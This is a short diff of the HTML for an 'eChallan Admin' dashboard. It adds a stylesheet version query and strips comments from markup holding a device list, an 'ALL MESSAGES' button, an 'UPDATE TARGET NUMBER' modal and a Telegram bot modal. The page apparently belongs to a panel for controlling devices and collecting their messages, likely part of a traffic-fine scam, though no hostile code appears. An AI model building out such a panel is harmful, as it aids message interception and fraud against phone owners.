@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Dashboard - eChallan Admin</title>
-  <link rel="stylesheet" href="css/style.css">
+  <link rel="stylesheet" href="css/style.css?v=2">
 </head>
 <body>
   <div class="app-header">
@@ -16,7 +16,6 @@
   </div>
 
   <div class="container">
-    <!-- Stats Card -->
     <div class="stats-main-card">
       <div class="stats-top">
         <div class="col">
@@ -35,7 +34,6 @@
       </div>
     </div>
 
-    <!-- Top Action Buttons -->
     <div class="top-actions">
       <button class="top-btn" onclick="location.href='messages.html'">ALL MESSAGES</button>
       <button class="top-btn" onclick="openUpdateNoModal()">UPDATE NO</button>
@@ -43,13 +41,11 @@
       <button class="top-btn" onclick="openTelegramModal()">TELEGRAM BOT</button>
     </div>
 
-    <!-- Device List -->
     <div class="device-list" id="deviceList">
       <div class="loading">Loading devices...</div>
     </div>
   </div>
 
-  <!-- Update Number Modal -->
   <div class="modal-overlay" id="modalUpdateNo">
     <div class="modal">
       <h3>📱 UPDATE TARGET NUMBER</h3>
@@ -65,7 +61,6 @@
     </div>
   </div>
 
-  <!-- Change Password Modal -->
   <div class="modal-overlay" id="modalChangePass">
     <div class="modal">
       <h3>🔐 CHANGE PASSWORD</h3>
@@ -88,7 +83,6 @@
     </div>
   </div>
 
-  <!-- Telegram Bot Modal -->
   <div class="modal-overlay" id="modalTelegram">
     <div class="modal">
       <h3>🤖 TELEGRAM BOT</h3>
@@ -114,7 +108,6 @@
     </div>
   </div>
 
-  <!-- Delete Confirmation Modal -->
   <div class="modal-overlay" id="modalDelete">
     <div class="modal">
       <h3>🗑️ DELETE DEVICE</h3>
